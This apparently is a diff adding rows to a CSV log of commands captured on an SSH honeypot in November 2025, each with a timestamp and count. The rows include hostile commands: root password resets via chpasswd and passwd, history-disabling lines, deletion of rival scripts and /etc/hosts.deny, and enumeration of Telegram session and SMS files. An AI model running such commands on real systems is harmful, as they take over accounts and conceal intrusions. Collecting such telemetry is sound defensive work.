+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,21/11/2025 12:00,4
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,22/11/2025 00:00,42
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,22/11/2025 12:00,26
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,23/11/2025 00:00,43
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,24/11/2025 00:00,10
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,25/11/2025 00:00,9
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,25/11/2025 12:00,28
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,26/11/2025 00:00,12
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,26/11/2025 12:00,2
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,27/11/2025 00:00,11
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,28/11/2025 00:00,1
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,28/11/2025 12:00,1
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,29/11/2025 00:00,13
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,29/11/2025 12:00,5
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,30/11/2025 00:00,24
+/bin/./uname -s -v -n -r -m,15/11/2025 12:00,25
+/bin/./uname -s -v -n -r -m,16/11/2025 00:00,3
+/bin/./uname -s -v -n -r -m,17/11/2025 00:00,36
+/bin/./uname -s -v -n -r -m,17/11/2025 12:00,9
+/bin/./uname -s -v -n -r -m,18/11/2025 00:00,11
+/bin/./uname -s -v -n -r -m,19/11/2025 00:00,33
+/bin/./uname -s -v -n -r -m,20/11/2025 00:00,14
+/bin/./uname -s -v -n -r -m,21/11/2025 00:00,18
+/bin/./uname -s -v -n -r -m,21/11/2025 12:00,1
+/bin/./uname -s -v -n -r -m,22/11/2025 00:00,19
+/bin/./uname -s -v -n -r -m,22/11/2025 12:00,4
+/bin/./uname -s -v -n -r -m,23/11/2025 00:00,23
+/bin/./uname -s -v -n -r -m,23/11/2025 12:00,3
+/bin/./uname -s -v -n -r -m,24/11/2025 00:00,23
+/bin/./uname -s -v -n -r -m,24/11/2025 12:00,1
+/bin/./uname -s -v -n -r -m,25/11/2025 00:00,17
+/bin/./uname -s -v -n -r -m,25/11/2025 12:00,6
+/bin/./uname -s -v -n -r -m,26/11/2025 00:00,23
+/bin/./uname -s -v -n -r -m,26/11/2025 12:00,2
+/bin/./uname -s -v -n -r -m,27/11/2025 00:00,21
+/bin/./uname -s -v -n -r -m,28/11/2025 00:00,25
+/bin/./uname -s -v -n -r -m,28/11/2025 12:00,4
+/bin/./uname -s -v -n -r -m,29/11/2025 00:00,15
+/bin/./uname -s -v -n -r -m,29/11/2025 12:00,11
+/bin/./uname -s -v -n -r -m,30/11/2025 00:00,32
+uname -s -v -n -m 2 > /dev/null,15/11/2025 00:00,5
+uname -s -v -n -m 2 > /dev/null,15/11/2025 12:00,8
+uname -s -v -n -m 2 > /dev/null,16/11/2025 00:00,1
+uname -s -v -n -m 2 > /dev/null,17/11/2025 12:00,3
+uname -s -v -n -m 2 > /dev/null,18/11/2025 00:00,2
+uname -s -v -n -m 2 > /dev/null,19/11/2025 00:00,8
+uname -s -v -n -m 2 > /dev/null,20/11/2025 00:00,1
+uname -s -v -n -m 2 > /dev/null,21/11/2025 00:00,5
+uname -s -v -n -m 2 > /dev/null,22/11/2025 12:00,1
+uname -s -v -n -m 2 > /dev/null,23/11/2025 00:00,4
+uname -s -v -n -m 2 > /dev/null,24/11/2025 00:00,7
+uname -s -v -n -m 2 > /dev/null,24/11/2025 12:00,1
+uname -s -v -n -m 2 > /dev/null,25/11/2025 12:00,1
+uname -s -v -n -m 2 > /dev/null,26/11/2025 00:00,1
+uname -s -v -n -m 2 > /dev/null,26/11/2025 12:00,1
+uname -s -v -n -m 2 > /dev/null,28/11/2025 00:00,4
+uname -s -v -n -m 2 > /dev/null,28/11/2025 12:00,1
+uname -s -v -n -m 2 > /dev/null,29/11/2025 00:00,3
+uname -s -v -n -m 2 > /dev/null,30/11/2025 00:00,4
+uname -s -v -n -m 2 > /dev/null,30/11/2025 12:00,1
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,15/11/2025 00:00,5
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,17/11/2025 12:00,3
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,18/11/2025 00:00,2
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,19/11/2025 00:00,7
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,21/11/2025 00:00,5
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,23/11/2025 00:00,4
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,24/11/2025 00:00,7
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,24/11/2025 12:00,1
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,26/11/2025 00:00,1
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,28/11/2025 00:00,4
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,29/11/2025 00:00,3
+cat /proc/uptime 2 > /dev/null | cut -d. -f1,30/11/2025 00:00,4
+uname -m 2 > /dev/null,15/11/2025 00:00,5
+uname -m 2 > /dev/null,17/11/2025 12:00,3
+uname -m 2 > /dev/null,18/11/2025 00:00,2
+uname -m 2 > /dev/null,19/11/2025 00:00,7
+uname -m 2 > /dev/null,21/11/2025 00:00,5
+uname -m 2 > /dev/null,23/11/2025 00:00,4
+uname -m 2 > /dev/null,24/11/2025 00:00,7
+uname -m 2 > /dev/null,24/11/2025 12:00,1
+uname -m 2 > /dev/null,26/11/2025 00:00,1
+uname -m 2 > /dev/null,28/11/2025 00:00,4
+uname -m 2 > /dev/null,29/11/2025 00:00,3
+uname -m 2 > /dev/null,30/11/2025 00:00,4
+uname -s -v -n -r -m,15/11/2025 00:00,4
+uname -s -v -n -r -m,15/11/2025 12:00,5
+uname -s -v -n -r -m,16/11/2025 00:00,1
+uname -s -v -n -r -m,17/11/2025 12:00,3
+uname -s -v -n -r -m,18/11/2025 00:00,2
+uname -s -v -n -r -m,18/11/2025 12:00,1
+uname -s -v -n -r -m,19/11/2025 12:00,1
+uname -s -v -n -r -m,20/11/2025 00:00,1
+uname -s -v -n -r -m,22/11/2025 12:00,2
+uname -s -v -n -r -m,24/11/2025 00:00,2
+uname -s -v -n -r -m,26/11/2025 12:00,1
+uname -s -v -n -r -m,27/11/2025 12:00,2
+uname -s -v -n -r -m,28/11/2025 00:00,1
+uname -s -v -n -r -m,28/11/2025 12:00,3
+uname -s -v -n -r -m,29/11/2025 00:00,4
+uname -s -v -n -r -m,30/11/2025 00:00,1
+(empty),16/11/2025 00:00,1
+(empty),21/11/2025 12:00,1
+(empty),23/11/2025 00:00,1
+(empty),24/11/2025 00:00,9
+(empty),29/11/2025 00:00,3
+echo 'SSH check',15/11/2025 00:00,1
+echo 'SSH check',17/11/2025 12:00,1
+echo 'SSH check',18/11/2025 00:00,1
+echo 'SSH check',19/11/2025 00:00,1
+echo 'SSH check',20/11/2025 00:00,1
+echo 'SSH check',21/11/2025 00:00,1
+echo 'SSH check',22/11/2025 00:00,1
+echo 'SSH check',23/11/2025 00:00,1
+echo 'SSH check',24/11/2025 00:00,1
+echo 'SSH check',25/11/2025 00:00,1
+echo 'SSH check',26/11/2025 00:00,1
+echo 'SSH check',28/11/2025 00:00,1
+echo 'SSH check',29/11/2025 12:00,1
+echo 'SSH check',30/11/2025 00:00,1
+"echo ""ERROR: BADtype: export""",24/11/2025 00:00,9
+exit,24/11/2025 00:00,9
+export HISTFILE=/dev/null,24/11/2025 00:00,9
+export HISTSAVE=/dev/null,24/11/2025 00:00,9
+if ! type export >/dev/null 2>&1; then,24/11/2025 00:00,9
+unset HISTFILE,24/11/2025 00:00,9
+unset HISTSAVE,24/11/2025 00:00,9
+/ip cloud print,17/11/2025 12:00,1
+/ip cloud print,20/11/2025 00:00,1
+/ip cloud print,21/11/2025 00:00,1
+/ip cloud print,25/11/2025 12:00,1
+/ip cloud print,29/11/2025 12:00,2
+"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
+",16/11/2025 00:00,1
+"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
+",21/11/2025 12:00,1
+"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
+",23/11/2025 00:00,1
+"cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps
+",29/11/2025 00:00,3
+cat /proc/cpuinfo,17/11/2025 12:00,1
+cat /proc/cpuinfo,20/11/2025 00:00,1
+cat /proc/cpuinfo,21/11/2025 00:00,1
+cat /proc/cpuinfo,25/11/2025 12:00,1
+cat /proc/cpuinfo,29/11/2025 12:00,2
+"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",16/11/2025 00:00,1
+"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",21/11/2025 12:00,1
+"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",23/11/2025 00:00,1
+"echo ""cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps"" | sh",29/11/2025 00:00,3
+echo Hi | cat -n,17/11/2025 12:00,1
+echo Hi | cat -n,20/11/2025 00:00,1
+echo Hi | cat -n,21/11/2025 00:00,1
+echo Hi | cat -n,25/11/2025 12:00,1
+echo Hi | cat -n,29/11/2025 12:00,2
+ifconfig,17/11/2025 12:00,1
+ifconfig,20/11/2025 00:00,1
+ifconfig,21/11/2025 00:00,1
+ifconfig,25/11/2025 12:00,1
+ifconfig,29/11/2025 12:00,2
+locate D877F783D5D3EF8Cs,17/11/2025 12:00,1
+locate D877F783D5D3EF8Cs,20/11/2025 00:00,1
+locate D877F783D5D3EF8Cs,21/11/2025 00:00,1
+locate D877F783D5D3EF8Cs,25/11/2025 12:00,1
+locate D877F783D5D3EF8Cs,29/11/2025 12:00,2
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,17/11/2025 12:00,1
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,20/11/2025 00:00,1
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,21/11/2025 00:00,1
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,25/11/2025 12:00,1
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,29/11/2025 12:00,2
+ps -ef | grep '[Mm]iner',17/11/2025 12:00,1
+ps -ef | grep '[Mm]iner',20/11/2025 00:00,1
+ps -ef | grep '[Mm]iner',21/11/2025 00:00,1
+ps -ef | grep '[Mm]iner',25/11/2025 12:00,1
+ps -ef | grep '[Mm]iner',29/11/2025 12:00,2
+ps | grep '[Mm]iner',17/11/2025 12:00,1
+ps | grep '[Mm]iner',20/11/2025 00:00,1
+ps | grep '[Mm]iner',21/11/2025 00:00,1
+ps | grep '[Mm]iner',25/11/2025 12:00,1
+ps | grep '[Mm]iner',29/11/2025 12:00,2
+uname -s -m,25/11/2025 00:00,1
+uname -s -m,26/11/2025 12:00,1
+uname -s -m,29/11/2025 00:00,1
+uname -s -m,30/11/2025 00:00,1
+echo SHELL_TEST,26/11/2025 12:00,1
+echo SHELL_TEST,29/11/2025 00:00,1
+echo SHELL_TEST,29/11/2025 12:00,1
+hostname,18/11/2025 12:00,1
+hostname,22/11/2025 12:00,1
+hostname,29/11/2025 00:00,1
+pwd,15/11/2025 00:00,1
+pwd,17/11/2025 12:00,1
+pwd,22/11/2025 00:00,1
+uptime,15/11/2025 00:00,1
+uptime,18/11/2025 00:00,1
+uptime,21/11/2025 00:00,1
+"echo ""root:UCqjwcbhHlDp""|chpasswd|bash",25/11/2025 12:00,2
+"echo ""root:rmU7SXyRvX5U""|chpasswd|bash",21/11/2025 00:00,2
+"echo -e ""\x6F\x6B""",21/11/2025 12:00,1
+"echo -e ""\x6F\x6B""",27/11/2025 00:00,1
+env | head -10,30/11/2025 00:00,2
+history | tail -5,22/11/2025 00:00,1
+history | tail -5,22/11/2025 12:00,1
+"echo ""!QAZ2wsx3edc\nQIca27fd18kj\nQIca27fd18kj\n""|passwd",22/11/2025 12:00,1
+"echo ""!QAZ2wsx3edc\nQfauuyVUELnL\nQfauuyVUELnL\n""|passwd",22/11/2025 12:00,1
+"echo ""!QAZ2wsx3edc\nixR6KLGpaABa\nixR6KLGpaABa\n""|passwd",22/11/2025 12:00,1
+"echo ""!\n2CZ5da5GmmiH\n2CZ5da5GmmiH\n""|passwd",21/11/2025 12:00,1
+"echo ""!\n3kJTZluATxLs\n3kJTZluATxLs\n""|passwd",18/11/2025 00:00,1
+"echo ""!\n7Y6dDH3DOCBI\n7Y6dDH3DOCBI\n""|passwd",18/11/2025 00:00,1
+"echo ""111\nxl21LohGrdM0\nxl21LohGrdM0\n""|passwd",17/11/2025 00:00,1
+"echo ""112233\nTbGuzbf67Sqa\nTbGuzbf67Sqa\n""|passwd",17/11/2025 12:00,1
+"echo ""123123\n96gxFMcGDkgG\n96gxFMcGDkgG\n""|passwd",17/11/2025 12:00,1
+"echo ""123456789\nJJA3l0eiYSmz\nJJA3l0eiYSmz\n""|passwd",30/11/2025 00:00,1
+"echo ""123456789\nJNsPIxh3Ux2N\nJNsPIxh3Ux2N\n""|passwd",20/11/2025 00:00,1
+"echo ""123456789\nVfgwGQZTTc2C\nVfgwGQZTTc2C\n""|passwd",20/11/2025 00:00,1
+"echo ""12345678\n2ulvuCcgW67h\n2ulvuCcgW67h\n""|passwd",15/11/2025 12:00,1
+"echo ""12345678\n8YV8ajsovdq5\n8YV8ajsovdq5\n""|passwd",17/11/2025 12:00,1
+"echo ""12345678\nBo8Iu29jFoAu\nBo8Iu29jFoAu\n""|passwd",22/11/2025 12:00,1
+"echo ""12345678\nK7JrMi3BzKn7\nK7JrMi3BzKn7\n""|passwd",22/11/2025 00:00,1
+"echo ""12345678\nRjh2Ifv73SwO\nRjh2Ifv73SwO\n""|passwd",22/11/2025 12:00,1
+"echo ""12345678\naAOawzuvpaxs\naAOawzuvpaxs\n""|passwd",17/11/2025 12:00,1
+"echo ""12345678\nb9bGBSPUnWwd\nb9bGBSPUnWwd\n""|passwd",15/11/2025 12:00,1
+"echo ""12345678\ngbkRyL7cZXHO\ngbkRyL7cZXHO\n""|passwd",21/11/2025 00:00,1
+"echo ""12345678\nn3MJ3OWUwL4i\nn3MJ3OWUwL4i\n""|passwd",22/11/2025 12:00,1
+"echo ""12345678\nwjofCIqJ3Ykp\nwjofCIqJ3Ykp\n""|passwd",20/11/2025 12:00,1
+"echo ""12345678\nxszH02L6jH1P\nxszH02L6jH1P\n""|passwd",15/11/2025 12:00,1
+"echo ""123456\n0QJFwKQwiJ9D\n0QJFwKQwiJ9D\n""|passwd",18/11/2025 00:00,1
+"echo ""123456\n1DqMgQQcPYYt\n1DqMgQQcPYYt\n""|passwd",30/11/2025 12:00,1
+"echo ""123456\n1jA9JtsvtBZg\n1jA9JtsvtBZg\n""|passwd",25/11/2025 00:00,1
+"echo ""123456\n2WovIJExACsn\n2WovIJExACsn\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\n2cdgDo57je00\n2cdgDo57je00\n""|passwd",18/11/2025 00:00,1
+"echo ""123456\n4IehPJzmD9s2\n4IehPJzmD9s2\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\n4apl5ehVBQbf\n4apl5ehVBQbf\n""|passwd",16/11/2025 00:00,1
+"echo ""123456\n6kJBTaMAY2BN\n6kJBTaMAY2BN\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\n7Dh3t5I9qqPD\n7Dh3t5I9qqPD\n""|passwd",24/11/2025 00:00,1
+"echo ""123456\n84ayP4Xsj60M\n84ayP4Xsj60M\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\n8wzG6As1Rqer\n8wzG6As1Rqer\n""|passwd",27/11/2025 00:00,1
+"echo ""123456\nALKOF0VMm7g8\nALKOF0VMm7g8\n""|passwd",19/11/2025 12:00,1
+"echo ""123456\nATeqThCYqGtr\nATeqThCYqGtr\n""|passwd",29/11/2025 12:00,1
+"echo ""123456\nAzPvvjCZmicy\nAzPvvjCZmicy\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nAzSnDLx0fANP\nAzSnDLx0fANP\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nBIqHY9FzxMwC\nBIqHY9FzxMwC\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nC7IaufR4EFMH\nC7IaufR4EFMH\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nDQDQQfj8Jpig\nDQDQQfj8Jpig\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nEEU029eH5usZ\nEEU029eH5usZ\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nEiqJMHnRj6fs\nEiqJMHnRj6fs\n""|passwd",27/11/2025 00:00,1
+"echo ""123456\nF8IuSfPMUGef\nF8IuSfPMUGef\n""|passwd",15/11/2025 00:00,1
+"echo ""123456\nFay7jE0MkOfw\nFay7jE0MkOfw\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nG1scn8O20SjB\nG1scn8O20SjB\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nHaQGXkQbnKQ1\nHaQGXkQbnKQ1\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nJeFfuSeMRlRG\nJeFfuSeMRlRG\n""|passwd",30/11/2025 12:00,1
+"echo ""123456\nKtmGHqUPCQQw\nKtmGHqUPCQQw\n""|passwd",26/11/2025 12:00,1
+"echo ""123456\nLDQvvHYTw7eE\nLDQvvHYTw7eE\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nLaM7r80C8buP\nLaM7r80C8buP\n""|passwd",24/11/2025 00:00,1
+"echo ""123456\nLo1FTgLA7FCo\nLo1FTgLA7FCo\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nLoPEBA2GthVP\nLoPEBA2GthVP\n""|passwd",27/11/2025 00:00,1
+"echo ""123456\nNnPj3EkrUQGZ\nNnPj3EkrUQGZ\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nR9UfgSoFgjXI\nR9UfgSoFgjXI\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nRBxBJM1ZpMrf\nRBxBJM1ZpMrf\n""|passwd",15/11/2025 00:00,1
+"echo ""123456\nRvbpKERcNjZe\nRvbpKERcNjZe\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nTM7rw8NrNnz4\nTM7rw8NrNnz4\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nTuO8qLgMdO7J\nTuO8qLgMdO7J\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nWrxXXCCWXxhZ\nWrxXXCCWXxhZ\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nXe7yjaHsNyyQ\nXe7yjaHsNyyQ\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nXyziz8eWdVYp\nXyziz8eWdVYp\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nY3zga1sJQu6K\nY3zga1sJQu6K\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nYKAXTeMjs45r\nYKAXTeMjs45r\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nYVtyiFSrjIKa\nYVtyiFSrjIKa\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nZLI4d0Bx9wCd\nZLI4d0Bx9wCd\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nZXe65nJoFFRG\nZXe65nJoFFRG\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nZfZhEpgYwYGb\nZfZhEpgYwYGb\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nZmGbF76WlQgg\nZmGbF76WlQgg\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\naOgCYpqJFhx3\naOgCYpqJFhx3\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nbO4pYqP3RQ09\nbO4pYqP3RQ09\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nbijT10IoDOzx\nbijT10IoDOzx\n""|passwd",18/11/2025 00:00,1
+"echo ""123456\nepKJuW6hlSOF\nepKJuW6hlSOF\n""|passwd",29/11/2025 12:00,1
+"echo ""123456\nfstG8co9ITNl\nfstG8co9ITNl\n""|passwd",30/11/2025 12:00,1
+"echo ""123456\ngSnHH5SGtcaK\ngSnHH5SGtcaK\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nhZKsGmzgDUC7\nhZKsGmzgDUC7\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\njkFqYZ8bA5iZ\njkFqYZ8bA5iZ\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nkQbGQ4Iowue1\nkQbGQ4Iowue1\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nlnPWQaNSUJSp\nlnPWQaNSUJSp\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nlsMEJ0agc1Xj\nlsMEJ0agc1Xj\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nm8UWDuqCUz3d\nm8UWDuqCUz3d\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nmEKFvmHSmFDj\nmEKFvmHSmFDj\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nmX8IQF7vFPkf\nmX8IQF7vFPkf\n""|passwd",20/11/2025 12:00,1
+"echo ""123456\nnGV1TIh3Ouvl\nnGV1TIh3Ouvl\n""|passwd",29/11/2025 12:00,1
+"echo ""123456\nnWixgjRqUBSk\nnWixgjRqUBSk\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\noEqzgtvwqfbv\noEqzgtvwqfbv\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nopfcEAguAzZu\nopfcEAguAzZu\n""|passwd",23/11/2025 00:00,1
+"echo ""123456\np82VbwIXziFe\np82VbwIXziFe\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nrmU5IKI17QOe\nrmU5IKI17QOe\n""|passwd",26/11/2025 00:00,1
+"echo ""123456\nsW8aNCRL2n2Q\nsW8aNCRL2n2Q\n""|passwd",25/11/2025 12:00,1
+"echo ""123456\nvHbM469fdIMR\nvHbM469fdIMR\n""|passwd",20/11/2025 00:00,1
+"echo ""123456\nw8zKnUT2OKRi\nw8zKnUT2OKRi\n""|passwd",30/11/2025 00:00,1
+"echo ""123456\nwdfFP0paC2Rq\nwdfFP0paC2Rq\n""|passwd",18/11/2025 00:00,1
+"echo ""123456\nwu5JQXIRp6qh\nwu5JQXIRp6qh\n""|passwd",19/11/2025 00:00,1
+"echo ""123456\nx4qbJa5kioBM\nx4qbJa5kioBM\n""|passwd",30/11/2025 00:00,1
+"echo ""12345\nmziyiDk3C8fS\nmziyiDk3C8fS\n""|passwd",19/11/2025 00:00,1
+"echo ""12345\no0ldjph8yChd\no0ldjph8yChd\n""|passwd",20/11/2025 00:00,1
+"echo ""1234\n0L59OI2A9mbA\n0L59OI2A9mbA\n""|passwd",19/11/2025 00:00,1
+"echo ""1234\n1lE8j6goZvXP\n1lE8j6goZvXP\n""|passwd",15/11/2025 12:00,1
+"echo ""1234\n1sVHuooWus2M\n1sVHuooWus2M\n""|passwd",28/11/2025 00:00,1
+"echo ""1234\n3wV5bkjH2YxU\n3wV5bkjH2YxU\n""|passwd",19/11/2025 00:00,1
+"echo ""1234\n4yfBa4j02TLx\n4yfBa4j02TLx\n""|passwd",15/11/2025 00:00,1
+"echo ""1234\n6AhhVIJ8Jhke\n6AhhVIJ8Jhke\n""|passwd",22/11/2025 00:00,1
+"echo ""1234\n7BVY5HjrTkoK\n7BVY5HjrTkoK\n""|passwd",19/11/2025 00:00,1
+"echo ""1234\nCGYRi6ej0pdU\nCGYRi6ej0pdU\n""|passwd",25/11/2025 12:00,1
+"echo ""1234\nUtGK4d4hTZg1\nUtGK4d4hTZg1\n""|passwd",22/11/2025 00:00,1
+"echo ""1234\nXol9RBDIXAEh\nXol9RBDIXAEh\n""|passwd",22/11/2025 00:00,1
+"echo ""1234\nbihvnJwkNNM5\nbihvnJwkNNM5\n""|passwd",15/11/2025 00:00,1
+"echo ""1234\nmmvsKO6xhS0S\nmmvsKO6xhS0S\n""|passwd",23/11/2025 00:00,1
+"echo ""1234\nvqfP5kGg42zr\nvqfP5kGg42zr\n""|passwd",22/11/2025 12:00,1
+"echo ""123\n0kw98LQ5PPLQ\n0kw98LQ5PPLQ\n""|passwd",25/11/2025 00:00,1
+"echo ""123\n1GppiFcKR3YC\n1GppiFcKR3YC\n""|passwd",22/11/2025 00:00,1
+"echo ""123\n1LP3Z6APi8xR\n1LP3Z6APi8xR\n""|passwd",15/11/2025 00:00,1
+"echo ""123\n2JGFAVDDeQZt\n2JGFAVDDeQZt\n""|passwd",19/11/2025 00:00,1
+"echo ""123\n3FpFc0QY0VKn\n3FpFc0QY0VKn\n""|passwd",28/11/2025 00:00,1
+"echo ""123\n3HYpzTWKBchG\n3HYpzTWKBchG\n""|passwd",15/11/2025 12:00,1
+"echo ""123\n3WN6VCAh4WHu\n3WN6VCAh4WHu\n""|passwd",25/11/2025 12:00,1
+"echo ""123\n5PsWN0RVT7ss\n5PsWN0RVT7ss\n""|passwd",25/11/2025 12:00,1
+"echo ""123\n5fx2QhUHZQ1s\n5fx2QhUHZQ1s\n""|passwd",15/11/2025 00:00,1
+"echo ""123\n6yfN7MyGvTx9\n6yfN7MyGvTx9\n""|passwd",24/11/2025 00:00,1
+"echo ""123\n8ZtS9ZDquCjE\n8ZtS9ZDquCjE\n""|passwd",24/11/2025 00:00,1
+"echo ""123\n8jW2xbmbApKy\n8jW2xbmbApKy\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nAVBaG08j4j0x\nAVBaG08j4j0x\n""|passwd",23/11/2025 00:00,1
+"echo ""123\nAxMwNjXXSoXb\nAxMwNjXXSoXb\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nDED5kGOFGNaJ\nDED5kGOFGNaJ\n""|passwd",29/11/2025 12:00,1
+"echo ""123\nERcHhTdD1acO\nERcHhTdD1acO\n""|passwd",19/11/2025 00:00,1
+"echo ""123\nH2OzCIBvQ4rn\nH2OzCIBvQ4rn\n""|passwd",25/11/2025 00:00,1
+"echo ""123\nHYmvTQWlmODn\nHYmvTQWlmODn\n""|passwd",19/11/2025 00:00,1
+"echo ""123\nJ2LVdHmsicZ5\nJ2LVdHmsicZ5\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nJhFbVyjTe5aG\nJhFbVyjTe5aG\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nJvmolXwjZHgQ\nJvmolXwjZHgQ\n""|passwd",29/11/2025 12:00,1
+"echo ""123\nK2ZVC8FzKXFc\nK2ZVC8FzKXFc\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nL0RolK0WSvb3\nL0RolK0WSvb3\n""|passwd",19/11/2025 00:00,1
